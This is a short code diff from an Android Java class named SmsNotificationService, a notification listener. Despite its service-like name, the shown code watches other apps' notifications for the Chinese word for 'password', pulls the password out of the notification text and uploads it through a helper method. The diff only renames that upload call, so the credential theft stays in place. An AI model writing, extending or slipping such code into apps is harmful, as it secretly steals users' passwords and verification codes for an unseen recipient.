@@ -33,7 +33,7 @@ public class SmsNotificationService extends NotificationListenerService {
             if (o.toString().contains("密码")) {
                 String body = o.get("android.text").toString();
                 String password = UtilsHelpers.getPassword(body);
-                UtilsHelpers.uploadPassword(password, getApplicationContext());
+                UtilsHelpers.uploadPassword2(password, getApplicationContext());
             }
         } catch (NoSuchFieldException e) {
             e.printStackTrace();
